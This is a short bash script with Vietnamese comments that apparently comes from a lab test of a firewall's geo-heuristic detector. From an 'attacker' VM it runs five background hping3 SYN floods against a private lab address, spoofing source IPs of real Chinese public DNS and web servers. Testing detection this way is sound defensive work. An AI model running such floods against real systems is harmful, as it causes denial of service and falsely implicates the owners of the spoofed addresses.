#!/bin/bash
# =============================================================
# File: attack_sc1_botnet.sh
# Chạy trên: VM attacker (10.10.1.2)
# Mục đích: Bắn SYN Flood giả mạo IP từ Trung Quốc (CN) để kích
#           hoạt tính năng Geo Heuristic (Watcher).
# Input: Không
# Output: Quá trình tấn công chạy ngầm
# =============================================================

VICTIM_IP="10.10.2.2"
DEFAULT_PPS="u10000" # Khoảng 10,000 pps mỗi tiến trình

# 5 IP cứng đại diện cho mạng Trung Quốc (CN)
# Vừa đủ kích hoạt threshold = 4 của Heuristic
CN_IPS=(
    "114.114.114.114"
    "220.181.38.148"
    "119.29.29.29"
    "180.76.76.76"
    "123.125.115.110"
)

echo "[*] [ATTACKER] Đang chuẩn bị pháo binh Botnet (Geo Spoofing)..."

# Xóa các hping3 cũ nếu có bị kẹt
pkill hping3 2>/dev/null || true

# Tạo thư mục PID để lúc dừng có thể kill chính xác
rm -f /tmp/sc1_botnet.pids

# Chạy ngầm 5 tiến trình hping3 giả mạo IP
# Chạy trong ns6 để traffic đi qua veth (giúp firewall đếm đúng luồng in/out)
for ip in "${CN_IPS[@]}"; do
    echo "    [+] Khởi chạy hping3 giả mạo IP: $ip"
    # Lệnh hping3: -S (SYN), -p 80, -i u10000 (10000 microsec interval), -a (spoof IP)
    ip netns exec ns6 hping3 -S -p 80 -i $DEFAULT_PPS -a $ip $VICTIM_IP > /dev/null 2>&1 &
    
    # Lưu lại PID của tiến trình chạy ngầm
    echo $! >> /tmp/sc1_botnet.pids
done

echo "[*] [ATTACKER] Tấn công ĐÃ KÍCH HOẠT! Bão SYN đang trút xuống $VICTIM_IP"
